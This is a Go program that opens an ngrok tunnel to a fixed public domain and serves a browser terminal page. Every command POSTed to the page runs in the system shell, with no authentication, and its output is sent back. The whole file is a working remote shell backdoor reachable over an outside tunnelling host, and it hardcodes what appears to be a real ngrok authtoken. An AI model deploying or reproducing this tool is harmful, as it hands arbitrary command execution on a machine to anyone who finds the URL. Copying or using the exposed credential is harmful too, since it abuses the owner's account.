package main

import (
	"context"
	"fmt"
	"html/template"
	"net/http"
	"os/exec"
	"runtime" // ოპერაციული სისტემის ამოსაცნობად

	"golang.ngrok.com/ngrok/v2"
)

var (
	server *http.Server
	agent  ngrok.Agent
)

func main() {
	startNgrok()
}

func startNgrok() {
	ctx := context.Background()
	var err error

	agent, err = ngrok.NewAgent(
		ngrok.WithAuthtoken("36gmx4MIeEG3BrAIUf9RiRC8Dzg_3g7KHHphRsiWQzNsQcJXu"),
	)
	if err != nil {
		fmt.Println("Agent error:", err)
		return
	}

	listener, err := agent.Listen(
		ctx,
		ngrok.WithURL("liked-together-mantis.ngrok-free.app"),
	)
	if err != nil {
		fmt.Println("Listener error:", err)
		return
	}

	fmt.Printf("Terminal Online: %s\n", listener.URL().String())

	server = &http.Server{
		Handler: http.HandlerFunc(handler),
	}

	if err := server.Serve(listener); err != nil && err != http.ErrServerClosed {
		fmt.Println("Server error:", err)
	}
}

func handler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.Error(w, "404", 404)
		return
	}
	if r.Method == "GET" {
		handleDirectory(w, r)
		return
	}
	if r.Method == "POST" {
		r.ParseForm()
		cmd1(w, r.Form.Get("cmd"))
	}
}

// ---- უნივერსალური ბრძანების გამშვები ----
func cmd1(w http.ResponseWriter, cmdrun string) {
	var cmd *exec.Cmd

	// ვამოწმებთ ოპერაციულ სისტემას
	if runtime.GOOS == "windows" {
		// Windows-ისთვის
		cmd = exec.Command("cmd", "/C", cmdrun)
	} else {
		// Linux-ისთვის და macOS-ისთვის
		cmd = exec.Command("/bin/sh", "-c", cmdrun)
	}

	out, err := cmd.CombinedOutput()

	if err != nil {
		// შეცდომის შეტყობინება წითლად
		errorMessage := fmt.Sprintf("[[;red;]Error: %s]\n", err.Error())
		w.Write([]byte(errorMessage))
		return
	}
	w.Write(out)
	w.Write([]byte("\n"))
}

func handleDirectory(w http.ResponseWriter, r *http.Request) {
	tpl, _ := template.New("tpl").Parse(html_tpl)
	tpl.Execute(w, nil)
}

// ---- დიზაინი Padding-ით და ფოკუსით ----
const html_tpl = `<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Classic RCMD</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/jquery.terminal/css/jquery.terminal.min.css" rel="stylesheet"/>
    <style>
        body, html { 
            margin: 0; 
            padding: 0; 
            height: 100%; 
            background-color: black; 
            overflow: hidden; 
        }
        #terminal-container { 
            height: 100vh; 
            width: 100%;
            padding: 30px 15px 0 15px; /* დაშორება ზემოდან და გვერდებიდან */
            box-sizing: border-box;
        }
        .terminal {
            --color: #aaa; 
            --background: black;
            --size: 1.2;
            font-family: 'Consolas', 'Courier New', monospace;
        }
    </style>
</head>
<body>
    <div id="terminal-container"></div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery.terminal/js/jquery.terminal.min.js"></script>

    <script>
        $(document).ready(function() {
            var term = $('#terminal-container').terminal(function(command, term) {
                if (command.trim() === '') return;
                term.pause();
                $.post('/', { cmd: command }, function(result) {
                    term.echo(result); 
                    term.resume();
                }).fail(function() {
                    term.error("Connection Lost");
                    term.resume();
                });
            }, {
                greetings: "Alex JujuSvili (c) 2023\nSystem Identified: ` + runtime.GOOS + `\nClassic Remote Terminal Ready...\nType '?' for help",
                prompt: '> ',
                formatters: true,
                history: true,
                onInit: function(term) {
                    term.focus();
                }
            });

            term.focus();
            $(document).click(function() { term.focus(); });
        });
    </script>
</body>
</html>`
